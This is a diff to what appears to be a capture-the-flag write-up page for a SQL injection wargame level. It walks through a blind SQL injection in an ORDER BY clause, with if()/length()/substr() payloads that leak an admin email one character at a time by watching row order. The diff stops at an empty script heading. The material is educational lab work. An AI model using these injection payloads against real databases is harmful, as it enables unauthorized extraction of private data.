@@ -5,6 +5,83 @@ pagination_prev: null
 sidebar_position: 24
 ---
 
+![[1 190.png]]
+
+We are provided with the SQL queries:
+
+```sql
+SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY {$_GET[order]}
+```
+
+```sql
+SELECT email FROM prob_hell_fire WHERE id='admin' AND email='{$_GET[email]}'`
+```
+
+The challenge returns the output in the form of a table.
+
+If we provide the following URI parameter:
+
+```
+?order=id
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY id
+```
+
+![[2 207.png]]
+
+As we can see there are two users: `admin` and `rubiya`.
+In this challenge, the users are sorted in the same way regardless if we order by `id` or `score`.
+
+Therefore we will have to solve this using two different methods:
+1. Assigning sort value
+2. Sorting by ASC or DESC
+
+## Blind SQL Injection - (Assigning different sort value)
+
+### Retrieving the email length
+
+If we provide the following URI parameter:
+
+```
+?order=if(id='admin' AND length(email)=[length], 1, 2)
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=[length], 1, 2)
+```
+
+Rows where the length of `email` for `id='admin'` is equal to the `[length]` that we provide, will be given the sort value 1. 
+All other rows will be given the sort value 2. 
+Rows with a lower sort value will appear first within the table.
+
+So, if the `admin` user appears first, we know that the `[length]` was correct.
+
+### Leaking the email
+
+If we provide the following URI parameter:
+
+```
+?order=if(id='admin' AND substr(email, 1, 1)='0', 1, 2)
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, [index], 1)='[character]', 1, 2)
+```
+
+Rows where the `id='admin'` and character of the `email` at `[index]` is the same as the `[character]` that we provide, will be given the sort value 1. 
+All other rows will be given sort value 2. Rows with a lower sort value will appear first within the table.
+
+So, if the `admin` user appears first, we know that the `[character]` at `[index]` was correct.
+
+
 ### Script
 
 ```python title="evil_wizard_script.py"
